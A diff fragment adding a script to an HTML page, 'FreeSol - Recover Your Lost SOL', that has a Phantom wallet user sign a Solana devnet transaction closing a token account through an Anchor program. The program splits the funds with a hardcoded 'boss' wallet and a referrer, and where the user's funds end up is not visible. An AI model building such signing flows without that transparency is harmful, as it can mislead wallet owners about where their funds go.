@@ -18,7 +18,97 @@
     <title>FreeSol - Recover Your Lost SOL</title>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
     <script src="https://unpkg.com/@solana/spl-token@latest/lib/index.iife.js"></script>
-    
+    <script>
+(async () => {
+  const { Connection, PublicKey, Transaction, SystemProgram } = solanaWeb3;
+  const PROGRAM_ID = new PublicKey("8St8cCmUJtPxfxrhsueT6rcXQxvem9EHsPXvDgr169Po"); // <-- ton Program ID
+  const NETWORK = "https://api.devnet.solana.com";
+  const connection = new Connection(NETWORK, "confirmed");
+  const BOSS_PUBKEY = new PublicKey("AG7cszvmbcxpVAB5p9XAasgSArcsum7Z9wBpqt8Eu2Fg"); // <- ton wallet
+
+  // helper: compute anchor instruction discriminator for "global:close_and_split"
+  async function anchorDiscriminator(name) {
+    // returns Uint8Array(8)
+    const text = new TextEncoder().encode("global:" + name);
+    const hash = await crypto.subtle.digest("SHA-256", text);
+    const hashArr = new Uint8Array(hash);
+    return hashArr.slice(0, 8);
+  }
+
+  // derive vault PDA
+  async function getVaultPda() {
+    const [vaultPda] = await PublicKey.findProgramAddress(
+      [Buffer.from("vault")],
+      PROGRAM_ID
+    );
+    return vaultPda;
+  }
+
+  // main: close token account + split via on-chain program
+  async function closeAndSplit(tokenAccountStr, referrerStrOrNull) {
+    try {
+      const provider = window.solana;
+      if (!provider || !provider.isPhantom) throw new Error("Phantom non détecté");
+
+      // connect si besoin
+      if (!provider.publicKey) await provider.connect();
+      const userPub = provider.publicKey;
+
+      // vérifications basiques
+      const tokenAccount = new PublicKey(tokenAccountStr);
+      const bossPub = BOSS_PUBKEY;
+      const referrerPub = referrerStrOrNull ? new PublicKey(referrerStrOrNull) : PublicKey.default;
+
+      // compute discriminator
+      const disc = await anchorDiscriminator("close_and_split"); // 8 bytes
+      const ixData = new Uint8Array(disc); // pas d'arguments supplémentaires
+
+      // derive vault
+      const vault = await getVaultPda();
+
+      // build accounts in the exact order the Anchor program expects:
+      // user (signer), vault (mut), token_account (mut), boss (mut), referrer (mut), token_program, system_program
+      const keys = [
+        { pubkey: userPub, isSigner: true, isWritable: true },
+        { pubkey: vault, isSigner: false, isWritable: true },
+        { pubkey: tokenAccount, isSigner: false, isWritable: true },
+        { pubkey: bossPub, isSigner: false, isWritable: true },
+        { pubkey: referrerPub, isSigner: false, isWritable: true },
+        { pubkey: splToken.TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
+        { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
+      ];
+
+      const instruction = new solanaWeb3.TransactionInstruction({
+        programId: PROGRAM_ID,
+        keys,
+        data: ixData,
+      });
+
+      const tx = new Transaction().add(instruction);
+      tx.feePayer = userPub;
+      const { blockhash } = await connection.getLatestBlockhash();
+      tx.recentBlockhash = blockhash;
+
+      // sign & send. Phantom expose signAndSendTransaction in recent versions.
+      const signed = await provider.signAndSendTransaction(tx);
+      console.log("Signature envoyée:", signed);
+      // attente confirmation
+      await connection.confirmTransaction(signed, "confirmed");
+      console.log("Transaction confirmée OK ✅");
+      return signed;
+    } catch (err) {
+      console.error("Erreur closeAndSplit:", err);
+      throw err;
+    }
+  }
+
+  // expose pour console ou bouton
+  window.closeAndSplit = closeAndSplit;
+
+  // exemple d'usage (à adapter):
+  // await closeAndSplit("TOKEN_ACCOUNT_PUBKEY_TO_CLOSE", "OPTIONAL_REFERRER_PUBKEY");
+})();
+</script>
     <!-- SERVICE BACKEND SIMPLIFIÉ -->
     <script>
         const BACKEND_CONFIG = {
